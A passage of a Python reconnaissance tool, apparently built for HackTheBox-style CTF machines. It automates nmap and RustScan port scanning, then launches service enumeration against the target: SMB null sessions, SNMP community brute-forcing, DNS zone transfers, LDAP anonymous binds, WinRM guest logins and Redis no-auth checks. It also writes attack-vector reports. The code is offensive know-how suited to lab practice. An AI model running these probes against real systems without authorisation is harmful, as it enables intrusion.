            return hostname
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# SERVICE ANALYSIS ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def run_with_progress(cmd, task_name):
    """Runs a command and updates a rich progress bar by parsing output."""
    if not HAS_RICH:
        subprocess.run(cmd)
        return

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[cyan]{task_name}", total=100)
        
        for line in process.stdout:
            match = re.search(r"About ([0-9.]+)% done", line)
            if match:
                pct = float(match.group(1))
                progress.update(task, completed=pct)
            
        process.wait()
        progress.update(task, completed=100)

def parse_services_xml(xml_files):
    """Parse nmap XML output into structured service data."""
    services = []
    for xml_file in xml_files:
        if not os.path.exists(xml_file):
            continue
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            for host in root.findall('host'):
                ports = host.find('ports')
                if ports is None: continue
                for port in ports.findall('port'):
                    state_el = port.find('state')
                    if state_el is None or state_el.get('state') not in ('open', 'open|filtered'):
                        continue
                    
                    portid = port.get('portid')
                    protocol = port.get('protocol')
                    state = state_el.get('state')
                    
                    service_el = port.find('service')
                    service = service_el.get('name') if service_el is not None else "unknown"
                    
                    version = ""
                    if service_el is not None:
                        product = service_el.get('product', '')
                        v = service_el.get('version', '')
                        extrainfo = service_el.get('extrainfo', '')
                        version_parts = [p for p in (product, v, extrainfo) if p]
                        version = " ".join(version_parts)
                    
                    services.append({
                        "port": portid,
                        "proto": protocol,
                        "state": state,
                        "service": service,
                        "version": version if version else "N/A",
                        "raw": f"{portid}/{protocol} {state} {service} {version}"
                    })
        except Exception as e:
            if HAS_RICH:
                console.print(f"[red]XML parse error on {xml_file}: {e}[/]")
    return services


def enrich_services(services, target, domain=None):
    """Enrich parsed services with intelligence from SERVICE_INTEL database.

    Returns list of enriched dicts with added fields: intel, risk, icon, vectors, commands
    """
    enriched = []
    for svc in services:
        svc_name = svc["service"].lower()
        # Resolve aliases
        if svc_name in SERVICE_ALIASES:
            resolved = SERVICE_ALIASES[svc_name]
            if resolved is None:
                # Known service but no specific intel
                svc["intel"] = None
                enriched.append(svc)
                continue
            svc_name = resolved

        # Also check if it's a known web service via version string
        version_lower = svc["version"].lower()
        if svc_name not in SERVICE_INTEL:
            # Check version string for web-related keywords
            if any(kw in version_lower for kw in ["http", "apache", "nginx", "iis", "lighttpd", "tomcat", "node", "werkzeug", "gunicorn", "express", "caddy", "jetty"]):
                svc_name = "http"
            elif any(kw in version_lower for kw in ["ssl/http", "https"]):
                svc_name = "https"
            elif "elasticsearch" in version_lower:
                svc_name = "elasticsearch"
            elif "couchdb" in version_lower:
                svc_name = "couchdb"
            elif "memcached" in version_lower:
                svc_name = "memcached"
            elif int(svc["port"]) in WEB_PORT_DEFAULTS:
                svc_name = "http"

            # Absolute overrides based on specific CTF ports
            port_map = {
                "5985": "wsman", "5986": "wsman",
                "2375": "docker", "2376": "docker",
                "873": "rsync",
                "9200": "elasticsearch", "9300": "elasticsearch",
                "11211": "memcached",
                "5984": "couchdb", "6984": "couchdb",
                "1521": "oracle-tns",
                "1099": "java-rmi",
                "6000": "x11", "6001": "x11",
                "79": "finger",
                "113": "ident",
                "8009": "ajp13",
                "3268": "globalcatLDAP", "3269": "globalcatLDAP",
            }
            if svc["port"] in port_map:
                svc_name = port_map[svc["port"]]

        intel = SERVICE_INTEL.get(svc_name)
        if intel:
            # Format commands with actual target/port/domain
            fmt_domain = domain or "DOMAIN.htb"
            commands = [
                cmd.format(target=target, port=svc["port"], domain=fmt_domain)
                for cmd in intel.get("commands", [])
            ]
            svc["intel"] = {
                "name": svc_name,
                "icon": intel["icon"],
                "risk": intel["risk"],
                "color": intel["color"],
                "vectors": intel["vectors"],
                "commands": commands,
                "notes": intel.get("notes", ""),
                "auto_recon": intel.get("auto_recon"),
            }
        else:
            svc["intel"] = None

        enriched.append(svc)
    return enriched


def detect_domains(content, target):
    """Enhanced domain detection from nmap output.

    Sources: SSL CN/SAN, HTTP redirects, DNS reverse, nmap script output
    """
    domains = set()

    # SSL Common Name
    domains.update(re.findall(r"Common Name: ([a-zA-Z0-9.-]+\.[a-z]{2,})", content))
    domains.update(re.findall(r"Subject: commonName=([a-zA-Z0-9.-]+\.[a-z]{2,})", content))

    # SSL Subject Alternative Names
    san_matches = re.findall(r"Subject Alternative Name:([^\n]+)", content)
    for san_line in san_matches:
        domains.update(re.findall(r"DNS:([a-zA-Z0-9.-]+\.[a-z]{2,})", san_line))

    # HTTP redirects
    domains.update(re.findall(r"redirect(?:ed)? to https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content, re.I))

    # HTTP title / server headers in nmap output
    domains.update(re.findall(r"Did not follow redirect to https?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content, re.I))

    # SMTP banner / EHLO
    domains.update(re.findall(r"EHLO\s+([a-zA-Z0-9.-]+\.[a-z]{2,})", content, re.I))
    domains.update(re.findall(r"220\s+([a-zA-Z0-9.-]+\.[a-z]{2,})", content))

    # LDAP / Kerberos domain hints
    domains.update(re.findall(r"Domain:\s+([a-zA-Z0-9.-]+\.[a-z]{2,})", content, re.I))
    domains.update(re.findall(r"DNS_Domain_Name:\s+([a-zA-Z0-9.-]+\.[a-z]{2,})", content, re.I))
    domains.update(re.findall(r"Forest:\s+([a-zA-Z0-9.-]+\.[a-z]{2,})", content, re.I))

    # DNS reverse lookup
    reverse_host = dns_reverse_lookup(target)
    if reverse_host and "." in reverse_host:
        domains.add(reverse_host)

    # Filter out the target IP itself and obvious non-domains
    domains = {d for d in domains if d and not re.match(r"^\d+\.\d+\.\d+\.\d+$", d)}

    return domains


def rank_domain(d):
    """CTF-aware domain priority: .htb > .thm > .local > shortest/alpha."""
    tld_priority = {"htb": 0, "thm": 1, "local": 2, "lan": 2, "corp": 3}
    tld = d.rsplit(".", 1)[-1].lower()
    return (tld_priority.get(tld, 9), len(d), d)


# ═══════════════════════════════════════════════════════════════════════════════
# REACTIVE RECON ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def launch_reactive_recon(enriched_services, target, main_domain, scratch_dir):
    """Launch reactive recon tools based on discovered services.

    Returns list of (name, description) for launched tools.
    """
    launched = []
    web_ports_handled = set()

    for svc in enriched_services:
        intel = svc.get("intel")
        if not intel or not intel.get("auto_recon"):
            continue

        recon_type = intel["auto_recon"]
        port = svc["port"]

        # ── Web Enumeration ──
        if recon_type in ("web", "web_ssl"):
            if port in web_ports_handled:
                continue
            web_ports_handled.add(port)

            protocol = "https" if recon_type == "web_ssl" or port in ['443', '8443', '4443', '9443'] else "http"
            host = main_domain if main_domain else target
            url = f"{protocol}://{host}" if port in ['80', '443'] else f"{protocol}://{host}:{port}"

            # Technology Fingerprinting (WhatWeb)
            if shutil.which("whatweb"):
                phase_result(f"🔎 WhatWeb Fingerprinting → {url}", "cyan")
                spawn_terminal(f"WhatWeb-{port}", f"echo '━━━ WHATWEB ━━━' && whatweb -a 3 {url}")
                launched.append(("WhatWeb", f"Tech fingerprinting on {url}"))
                time.sleep(0.5)

            # VHost discovery (only if we have a domain)
            if main_domain:
                phase_result(f"💣 VHost / Subdomain Discovery → {main_domain}:{port}", "green")
                vhost_cmd = f"govhost {url}"
                if shutil.which("ffuf"):
                    vhost_cmd += f" && echo '\\n━━━ FFUF VHOSTS ━━━' && ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u {url} -H 'Host: FUZZ.{main_domain}' -mc 200,204,301,302,307,401,403,405"
                spawn_terminal(f"VHost-{port}", vhost_cmd)
                launched.append(("VHost", f"Virtual Host + FFuF discovery on {url}"))
                time.sleep(0.8)

            # Feroxbuster
            ferox_log = os.path.join(scratch_dir, f"ferox_{port}.json")
            phase_result(f"🕷️ Feroxbuster + Web Inspector → {port}", "green")
            spawn_terminal(f"Fero-{port}", f"ferodir {url} -o {ferox_log}")
            launched.append(("ferodir", f"Directory fuzzing on {url}"))
            time.sleep(0.8)

        # ── SMB Enumeration ──
        elif recon_type == "smb":
            if shutil.which("crackmapexec") or shutil.which("nxc"):
                cme = "nxc" if shutil.which("nxc") else "crackmapexec"
                cmd = f"echo '━━━ SMB ENUM ━━━' && {cme} smb {target} && echo '\\n━━━ SHARES ━━━' && smbclient -N -L //{target} 2>/dev/null"
                if shutil.which("enum4linux-ng"):
                    cmd += f" && echo '\\n━━━ ENUM4LINUX ━━━' && enum4linux-ng {target}"
                elif shutil.which("enum4linux"):
                    cmd += f" && echo '\\n━━━ ENUM4LINUX ━━━' && enum4linux {target}"
                phase_result(f"📁 SMB Enumeration → {target}:445", "yellow")
                spawn_terminal("SMB-Enum", cmd)
                launched.append(("SMB", f"CrackMapExec + smbclient on {target}"))
                time.sleep(0.5)

        # ── FTP Anonymous Check ──
        elif recon_type == "ftp":
            cmd = f"echo '━━━ FTP SCRIPTS ━━━' && nmap --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -p{port} {target}"
            phase_result(f"📂 FTP Anon Check → {target}:{port}", "yellow")
            spawn_terminal(f"FTP-{port}", cmd)
            launched.append(("FTP", f"Anonymous login + vuln check on {target}:{port}"))
            time.sleep(0.5)

        # ── SNMP Enumeration ──
        elif recon_type == "snmp":
            if shutil.which("snmpwalk"):
                cmd = f"echo '━━━ SNMP WALK ━━━' && snmpwalk -v2c -c public {target} 2>&1 | head -200"
                if shutil.which("onesixtyone"):
                    snmp_wordlist = ""
                    for candidate in [
                        "/opt/homebrew/share/seclists/Discovery/SNMP/snmp.txt",
                        "/usr/share/seclists/Discovery/SNMP/snmp.txt",
                    ]:
                        if os.path.exists(candidate):
                            snmp_wordlist = candidate
                            break
                    if snmp_wordlist:
                        cmd += f" && echo '\\n━━━ COMMUNITY BRUTE ━━━' && onesixtyone -c {snmp_wordlist} {target}"
                phase_result(f"📡 SNMP Enumeration → {target}", "yellow")
                spawn_terminal("SNMP-Enum", cmd)
                launched.append(("SNMP", f"SNMP walk + community brute on {target}"))
                time.sleep(0.5)

        # ── DNS Zone Transfer ──
        elif recon_type == "dns":
            domain = main_domain or "DOMAIN.htb"
            cmd = f"echo '━━━ DNS ZONE TRANSFER ━━━' && dig axfr @{target} {domain} && echo '\\n━━━ DNS ANY ━━━' && dig any @{target} {domain}"
            phase_result(f"🌍 DNS Zone Transfer → {target} ({domain})", "blue")
            spawn_terminal("DNS-Enum", cmd)
            launched.append(("DNS", f"Zone transfer attempt on {target}"))
            time.sleep(0.5)

        # ── LDAP Anonymous Bind ──
        elif recon_type == "ldap":
            if shutil.which("ldapsearch"):
                cmd = (
                    f"echo '━━━ LDAP ROOTDSE ━━━' && "
                    f"ldapsearch -x -H ldap://{target}:{port} -b '' -s base namingcontexts && "
                    f"echo '\\n━━━ LDAP ENUM ━━━' && "
                    f"nmap --script ldap-rootdse,ldap-search -p{port} {target}"
                )
                phase_result(f"📋 LDAP Anonymous Bind → {target}:{port}", "yellow")
                spawn_terminal("LDAP-Enum", cmd)
                launched.append(("LDAP", f"Anonymous bind + enum on {target}:{port}"))
                time.sleep(0.5)

        # ── NFS Shares ──
        elif recon_type == "nfs":
            if shutil.which("showmount"):
                cmd = f"echo '━━━ NFS SHARES ━━━' && showmount -e {target}"
                phase_result(f"💾 NFS Shares → {target}", "yellow")
                spawn_terminal("NFS-Enum", cmd)
                launched.append(("NFS", f"Show mountable shares on {target}"))
                time.sleep(0.5)

        # ── WinRM Enumeration ──
        elif recon_type == "winrm":
            if shutil.which("crackmapexec") or shutil.which("nxc"):
                cme = "nxc" if shutil.which("nxc") else "crackmapexec"
                cmd = f"echo '━━━ WINRM ENUM ━━━' && {cme} winrm {target} -u 'guest' -p ''"
                phase_result(f"⚡ WinRM Check → {target}:{port}", "magenta")
                spawn_terminal("WinRM-Check", cmd)
                launched.append(("WinRM", f"CrackMapExec on {target}"))
                time.sleep(0.5)

        # ── Rsync Enumeration ──
        elif recon_type == "rsync":
            if shutil.which("rsync"):
                cmd = f"echo '━━━ RSYNC MODULES ━━━' && rsync --list-only rsync://{target}:{port}/"
                phase_result(f"🔄 Rsync Check → {target}:{port}", "yellow")
                spawn_terminal("Rsync-Enum", cmd)
                launched.append(("Rsync", f"List exposed modules on {target}:{port}"))
                time.sleep(0.5)

        # ── Redis No-Auth Check ──
        elif recon_type == "redis":
            if shutil.which("redis-cli"):
                cmd = f"echo '━━━ REDIS INFO ━━━' && redis-cli -h {target} -p {port} INFO 2>&1 | head -50"
                phase_result(f"🔴 Redis Check → {target}:{port}", "red")
                spawn_terminal(f"Redis-{port}", cmd)
                launched.append(("Redis", f"No-auth check on {target}:{port}"))
                time.sleep(0.5)

    return launched


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT GENERATION
# ═══════════════════════════════════════════════════════════════════════════════

def generate_services_md(enriched_services, target, domains, report_file):
    """Generate enriched services.md with attack vectors and commands."""
    with open(report_file, "w", encoding="utf-8") as f:
        f.write(f"# 󰓾  Servicios Detectados — {target} 💀\n")
        f.write(f"📅 Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        if domains:
            f.write(f"🌐 Dominios: {', '.join(sorted(domains))}\n")
        f.write("\n")

        # Service table
        f.write("## 📊 Puertos & Servicios\n\n")
        f.write("| Puerto | Servicio | Versión / Info | Riesgo |\n")
        f.write("| :--- | :--- | :--- | :---: |\n")

        for svc in enriched_services:
            risk = ""
            icon = ""
            if svc.get("intel"):
                risk = svc["intel"]["risk"]
                icon = svc["intel"]["icon"]
                risk_emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(risk, "⚪")
                risk = f"{risk_emoji} {risk}"
            f.write(f"| {icon} **{svc['port']}/{svc['proto']}** | {svc['service']} | {svc['version']} | {risk} |\n")

        # Attack vectors per service
        f.write("\n## 🎯 Vectores de Ataque\n\n")
        for svc in enriched_services:
            if not svc.get("intel"):
                continue
            intel = svc["intel"]
            version_str = f" (`{svc['version']}`)" if svc.get('version') and svc['version'] != 'unknown' else ""
            f.write(f"### {intel['icon']} {svc['port']}/{svc['proto']} — {svc['service']}{version_str}\n\n")
            f.write(f"**Riesgo:** {intel['risk']}  \n")
            f.write(f"**Vectores:** {', '.join(intel['vectors'])}  \n")
            if intel.get("notes"):
                f.write(f"**Notas:** {intel['notes']}  \n")
            f.write("\n**Comandos sugeridos:**\n")
            for cmd in intel.get("commands", []):
                f.write(f"```bash\n{cmd}\n```\n")
            f.write("\n")


def generate_recon_summary(enriched_services, target, domains, launched_recon, out_dir):
    """Generate consolidated recon_summary.md with all intelligence."""
    summary_file = os.path.join(out_dir, "recon_summary.md")

    with open(summary_file, "w", encoding="utf-8") as f:
        f.write(f"# 🔍 Recon Summary — {target}\n")
        f.write(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  \n")
        f.write(f"🔧 Generated by PHANTOM RECON v{VERSION} ({CODENAME})\n\n")

        # Quick stats
        tcp_count = len([s for s in enriched_services if s["proto"] == "tcp"])
        udp_count = len([s for s in enriched_services if s["proto"] == "udp"])
        critical = len([s for s in enriched_services if s.get("intel") and s["intel"]["risk"] == "CRITICAL"])
        high = len([s for s in enriched_services if s.get("intel") and s["intel"]["risk"] == "HIGH"])

        f.write("## 📊 Quick Stats\n\n")
        f.write(f"| Metric | Value |\n")
        f.write(f"| :--- | :--- |\n")
        f.write(f"| TCP Ports Open | {tcp_count} |\n")
        f.write(f"| UDP Ports Open | {udp_count} |\n")
        f.write(f"| Critical Risk Services | {critical} |\n")
        f.write(f"| High Risk Services | {high} |\n")
        f.write(f"| Domains Discovered | {len(domains)} |\n")
        f.write(f"| Recon Tools Launched | {len(launched_recon)} |\n\n")

        # Domains
        if domains:
            f.write("## 🌐 Dominios\n\n")
            for d in sorted(domains):
                f.write(f"- `{d}`\n")
            f.write(f"\n**`/etc/hosts`**: `{target} {' '.join(sorted(domains))}`\n\n")

        # Services
        f.write("## 🎯 Servicios (Priorizado por Riesgo)\n\n")
        risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_services = sorted(
            enriched_services,
            key=lambda s: risk_order.get(s["intel"]["risk"], 9) if s.get("intel") else 9
        )
        for svc in sorted_services:
            intel = svc.get("intel")
            icon = intel["icon"] if intel else "❓"
            risk = intel["risk"] if intel else "UNKNOWN"
            f.write(f"### {icon} {svc['port']}/{svc['proto']} — {svc['service']} `{svc['version']}` [{risk}]\n\n")
            if intel:
                for cmd in intel.get("commands", []):
                    f.write(f"```\n{cmd}\n```\n")
                if intel.get("notes"):
                    f.write(f"> 💡 {intel['notes']}\n")
            f.write("\n")

        # Launched recon
        if launched_recon:
            f.write("## 🚀 Recon Lanzado\n\n")
            f.write("| Tool | Description |\n")
            f.write("| :--- | :--- |\n")
            for name, desc in launched_recon:
                f.write(f"| **{name}** | {desc} |\n")
            f.write("\n")

        # Next steps checklist
        f.write("## ✅ Checklist Manual\n\n")
        checklist = []
        service_names = {s["service"].lower() for s in enriched_services}
        service_names_resolved = set()
        for s in enriched_services:
            if s.get("intel"):
                service_names_resolved.add(s["intel"]["name"])

        if "ssh" in service_names_resolved:
            checklist.append("- [ ] SSH: Check version CVEs, try found credentials")
        if any(s in service_names_resolved for s in ["http", "https", "ssl/http"]):
            checklist.append("- [ ] Web: Review feroxbuster/govhost results")
            checklist.append("- [ ] Web: Check technologies (Wappalyzer / headers)")
            checklist.append("- [ ] Web: Look for login pages, file uploads, APIs")
        if "microsoft-ds" in service_names_resolved:
            checklist.append("- [ ] SMB: Review shares for sensitive files")
            checklist.append("- [ ] SMB: Check null/guest session access")
        if "domain" in service_names_resolved:
            checklist.append("- [ ] DNS: Review zone transfer results")
        if "kerberos-sec" in service_names_resolved:
            checklist.append("- [ ] Kerberos: AS-REP roast, user enum")
        if "ldap" in service_names_resolved:
            checklist.append("- [ ] LDAP: Review anonymous bind results, check descriptions")
        if any(s in service_names_resolved for s in ["mysql", "ms-sql-s", "postgresql", "mongodb"]):
            checklist.append("- [ ] DB: Try default/empty credentials")
        if "ftp" in service_names_resolved:
            checklist.append("- [ ] FTP: Check anonymous upload capabilities")

        if checklist:
            for item in checklist:
                f.write(f"{item}\n")
        else:
            f.write("- [ ] Review all scan results\n")

    return summary_file


def get_notes_dir(out_dir):
    """Notes live in a hidden, centralized HTB/.notas/<machine> dir so they
    survive cleanups of the per-machine folder."""
    htb_root = os.path.dirname(os.path.abspath(out_dir))
    machine = os.path.basename(os.path.normpath(out_dir)) or "unknown"
    return os.path.join(htb_root, ".notas", machine)


def update_timeline(out_dir, entries):
    """Append entries to the machine timeline."""
    timeline_file = os.path.join(get_notes_dir(out_dir), "timeline.md")
    if not os.path.exists(timeline_file):
        os.makedirs(os.path.dirname(timeline_file), exist_ok=True)
        with open(timeline_file, "w") as f:
            f.write("# ⏱ Timeline\n\n")

    with open(timeline_file, "a") as f:
        for entry in entries:
            timestamp = datetime.now().strftime('%H:%M:%S')
            f.write(f"- `{timestamp}` — {entry}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# FINAL DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════════

def print_final_dashboard(enriched_services, domains, launched_recon, target, total_time):
    """Print the final rich dashboard with all results."""
    if not HAS_RICH:
        print(f"\n\033[1;32m[+] ✅ nmap_scan finalizado en {total_time:.0f}s\033[0m")
        return

    console.print()

    # ── Services Table ──
    table = Table(
        title=f"🎯 SERVICIOS — {target}",
        box=box.DOUBLE_EDGE,
        show_header=True,
        header_style="bold cyan",
        border_style="bright_magenta",
        expand=True,
        title_style="bold gold1",
    )
    table.add_column("Puerto", style="bold white", width=12, justify="center")
    table.add_column("Servicio", style="cyan", width=18)
    table.add_column("Versión", style="grey70", max_width=40)
    table.add_column("Riesgo", justify="center", width=12)
    table.add_column("Vectores", style="yellow", max_width=50)

    risk_style = {
        "CRITICAL": "[bold red]🔴 CRITICAL[/]",
        "HIGH": "[bold yellow]🟠 HIGH[/]",
        "MEDIUM": "[yellow]🟡 MEDIUM[/]",
        "LOW": "[green]🟢 LOW[/]",
    }

    for svc in enriched_services:
        intel = svc.get("intel")
        icon = intel["icon"] if intel else "❓"
        risk = risk_style.get(intel["risk"], "⚪ ?") if intel else "⚪ ?"
        vectors = ", ".join(intel["vectors"][:3]) if intel else "—"
        table.add_row(
            f"{icon} {svc['port']}/{svc['proto']}",
            svc["service"],
            escape(svc["version"][:40]),
            risk,
            vectors,
        )

    console.print(table)

    # ── Domains Panel ──
    if domains:
        domain_text = "\n".join(f"  🌐 [bold cyan]{d}[/]" for d in sorted(domains))
        console.print(Panel(
            domain_text,
            title="🔍 DOMINIOS DETECTADOS",
            border_style="cyan",
            box=box.ROUNDED,
        ))

    # ── Launched Recon Panel ──
    if launched_recon:
        recon_text = "\n".join(
            f"  [bold green]▸[/] [bold]{name}[/] — {desc}"
            for name, desc in launched_recon
        )
        console.print(Panel(
            recon_text,
            title="🚀 RECON REACTIVO LANZADO",
            border_style="green",
            box=box.ROUNDED,
        ))

    # ── Final Stats ──
    tcp_count = len([s for s in enriched_services if s["proto"] == "tcp"])
    udp_count = len([s for s in enriched_services if s["proto"] == "udp"])
    critical = len([s for s in enriched_services if s.get("intel") and s["intel"]["risk"] == "CRITICAL"])
    high = len([s for s in enriched_services if s.get("intel") and s["intel"]["risk"] == "HIGH"])

    stats = (
        f"[bold cyan]TCP:[/] {tcp_count}  │  "
        f"[bold cyan]UDP:[/] {udp_count}  │  "
        f"[bold red]Critical:[/] {critical}  │  "
        f"[bold yellow]High:[/] {high}  │  "
        f"[bold cyan]Domains:[/] {len(domains)}  │  "
        f"[bold green]Recon:[/] {len(launched_recon)}  │  "
        f"[grey50]⏱ {total_time:.0f}s[/]"
    )
    console.print(Panel.fit(
        stats,
        title="[bold gold1]✅ SCAN COMPLETE[/]",
        border_style="bold green",
        box=box.DOUBLE_EDGE,
    ))


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_nmap_scan(target, fast=False, stealth=False, no_nuclei=False):
    """Main scanning pipeline."""
    global_start = time.time()

    out_dir = os.environ.get("RECON_OUT_DIR") or os.environ.get("HTB_MACHINE") or "./recon_output"
    nmap_dir = os.path.join(out_dir, "nmap")
    os.makedirs(nmap_dir, exist_ok=True)
    # Reports (.md) live in the HTB folder (vport/obsidian read them).
    report_file = os.path.join(nmap_dir, "services.md")
    # Raw scan artifacts (XML, full nmap txt) go to an auto-cleaned /tmp dir
    # so they don't clutter the Mac. Only the .md summaries persist.
    scratch_dir = tempfile.mkdtemp(prefix="nmap_engine_")
    detailed_file = os.path.join(scratch_dir, "detailed_scan.txt")
    udp_file = os.path.join(scratch_dir, "detailed_udp.txt")

    mode = "STEALTH" if stealth else ("FAST" if fast else "FULL CTF")
    total_phases = 4 if fast else 5

    # ── BANNER ──
    print_banner(target, mode)

    if not shutil.which("nmap"):
        phase_result("nmap not found in PATH!", "red")
        return

    # ── PRE-AUTH SUDO ──
    # Robust: use cached ticket if present (works in background/mkmachine).
    # Only prompt interactively when attached to a real terminal.
    if subprocess.run(["sudo", "-n", "-v"], capture_output=True).returncode != 0:
        if sys.stdin.isatty():
            if HAS_RICH:
                console.print("[grey50]  🔑 Requesting sudo privileges for raw socket scanning...[/]")
            try:
                subprocess.run(["sudo", "-v"], check=True)
            except subprocess.CalledProcessError:
                phase_result("sudo authentication failed — aborting.", "red")
                return
        else:
            phase_result("No sudo ticket cached and no terminal to prompt.", "red")
            phase_result("Run 'sudo -v' first, then re-launch (needed for SYN/UDP scans).", "yellow")
            return

    timeline_entries = [f"🔍 nmap_scan started → {target} (mode: {mode})"]

    # ══════════════════════════════════════════════════════════════════
    # PHASE 1: HOST VALIDATION
    # ══════════════════════════════════════════════════════════════════
    phase_header(1, total_phases, "HOST VALIDATION", "🏓")
    t0 = time.time()

    alive, method = check_host_alive(target)
    if alive:
        phase_result(f"Host is UP (detected via {method})", "green")
    else:
        phase_result("Host appears DOWN (ICMP + TCP connect failed)", "yellow")
        phase_result("Continuing anyway (host may be filtering probes)...", "yellow")
    phase_timing(time.time() - t0)

    # ══════════════════════════════════════════════════════════════════
    # PHASE 2 & 3: CONCURRENT TCP & UDP DISCOVERY
    # ══════════════════════════════════════════════════════════════════
    phase_header(2, total_phases, "CONCURRENT TCP/UDP DISCOVERY", "🔍")
    t0 = time.time()

    rate, rtt = get_adaptive_rate(target)
    rtt_str = f"{rtt:.0f}ms" if rtt > 0 else "unknown"
    if stealth:
        rate = "1000"
        phase_result(f"Stealth mode: rate limited to {rate} pps", "magenta")
    else:
        phase_result(f"Latency: {rtt_str} → adaptive rate: {rate} pps", "cyan")

    tcp_ports = []
    udp_ports = []

    def run_tcp_discovery():
        local_tcp_ports = []
        if shutil.which("rustscan") and not stealth:
            phase_result("⚡ RustScan (TCP) started...", "cyan")
            rust_args = ["rustscan", "-a", target, "--ulimit", "5000", "-b", rate, "-g"]
            p1 = subprocess.run(rust_args, capture_output=True, text=True)
            match = re.search(r"\[([0-9,]+)\]", p1.stdout)
            if match:
                local_tcp_ports = match.group(1).split(",")
            if not local_tcp_ports:
                phase_result("RustScan failed, falling back to Nmap...", "yellow")

        if not local_tcp_ports:
            phase_result("🔍 Nmap (TCP) started...", "cyan")
            nmap_args = [
                "sudo", "nmap", "-p-", "-sS", "-n", "-Pn", "--open",
                "--min-rate", rate, "--max-retries", "2", target, "-oG", "-"
            ]
            if stealth:
                nmap_args = [
                    "sudo", "nmap", "-p-", "-sS", "-n", "-Pn", "--open",
                    "--min-rate", rate, "--max-retries", "3", "-T2", target, "-oG", "-"
                ]
            p1 = subprocess.run(nmap_args, capture_output=True, text=True)
            local_tcp_ports = parse_open_ports(p1.stdout, "tcp")
        return local_tcp_ports

    def run_udp_discovery():
        if fast:
            return []
        phase_result("📡 Nmap (UDP top-100) started...", "cyan")
        pu = subprocess.run(
            ["sudo", "nmap", "-sU", "--top-ports", "100", "-n", "-Pn", "--open",
             "--max-retries", "1", target, "-oG", "-"],
            capture_output=True, text=True
        )
        return parse_open_ports(pu.stdout, "udp")

    with ThreadPoolExecutor(max_workers=2) as executor:
        future_tcp = executor.submit(run_tcp_discovery)
        future_udp = executor.submit(run_udp_discovery)
        
        tcp_ports = future_tcp.result()
        udp_ports = future_udp.result()

    elapsed_p2_3 = time.time() - t0

    if tcp_ports:
        phase_result(f"TCP open: {','.join(tcp_ports)} ({len(tcp_ports)} ports)", "green")
        timeline_entries.append(f"🎯 TCP ports: {','.join(tcp_ports)}")
    else:
        phase_result("No TCP ports detected", "red")
        
    if not fast:
        if udp_ports:
            phase_result(f"UDP open: {','.join(udp_ports)} ({len(udp_ports)} ports)", "green")
            timeline_entries.append(f"📡 UDP ports: {','.join(udp_ports)}")
        else:
            phase_result("No UDP ports detected (common — most filter ICMP)", "grey50")

    phase_timing(elapsed_p2_3)

    if not tcp_ports and not udp_ports:
        phase_result("❌ No open ports detected. Host may be down or fully filtered.", "red")
        timeline_entries.append("❌ No open ports detected")
        update_timeline(out_dir, timeline_entries)
        return

    # ══════════════════════════════════════════════════════════════════
    # PHASE 4: DEEP ENUMERATION (-sC -sV)
    # ══════════════════════════════════════════════════════════════════
    deep_phase = 3 if fast else 4
    phase_header(deep_phase, total_phases, "DEEP ENUMERATION (-sC -sV)", "⚙️")
    t0 = time.time()

    content = ""
    xml_files = []

    if tcp_ports:
        phase_result(f"TCP deep scan on {len(tcp_ports)} ports...", "cyan")
        xml_tcp = os.path.join(scratch_dir, "detailed_tcp.xml")
        xml_files.append(xml_tcp)
        cmd = [
            "sudo", "nmap", "-sS", "-sC", "-sV", "--reason", "-n", "-Pn", "-T4",
             "--max-retries", "2", "-p", ",".join(tcp_ports), target,
             "--stats-every", "3s",
             "-oN", detailed_file, "-oX", xml_tcp
        ]
        run_with_progress(cmd, f"TCP Deep Scan ({len(tcp_ports)} ports)")
        with open(detailed_file, "r") as f:
            content += f.read() + "\n"

    if udp_ports:
        phase_result(f"UDP version scan on {len(udp_ports)} ports...", "cyan")
        xml_udp = os.path.join(scratch_dir, "detailed_udp.xml")
        xml_files.append(xml_udp)
        cmd = [
            "sudo", "nmap", "-sU", "-sV", "--reason", "-n", "-Pn",
             "--max-retries", "1", "-p", ",".join(udp_ports), target,
             "--stats-every", "3s",
             "-oN", udp_file, "-oX", xml_udp
        ]
        run_with_progress(cmd, f"UDP Version Scan ({len(udp_ports)} ports)")
        with open(udp_file, "r") as f:
            content += f.read() + "\n"

    elapsed_p4 = time.time() - t0
    phase_timing(elapsed_p4)

    # ── Parse services ──
    services = parse_services_xml(xml_files)
    phase_result(f"Parsed {len(services)} services from nmap XML output", "green")

    # ══════════════════════════════════════════════════════════════════
    # PHASE 5: INTELLIGENCE & REACTIVE RECON
    # ══════════════════════════════════════════════════════════════════
    intel_phase = 4 if fast else 5
    phase_header(intel_phase, total_phases, "INTELLIGENCE & REACTIVE RECON", "🧠")
    t0 = time.time()

    # ── Domain Intelligence ──
    domains = detect_domains(content, target)
    main_domain = None
    if domains:
        main_domain = sorted(domains, key=rank_domain)[0]
        phase_result(f"Primary domain: {main_domain}", "green")
        extra = sorted(d for d in domains if d != main_domain)
        if extra:
            phase_result(f"Additional domains: {', '.join(extra)}", "cyan")
        phase_result("Updating /etc/hosts...", "yellow")
        update_etc_hosts(target, [main_domain] + extra)
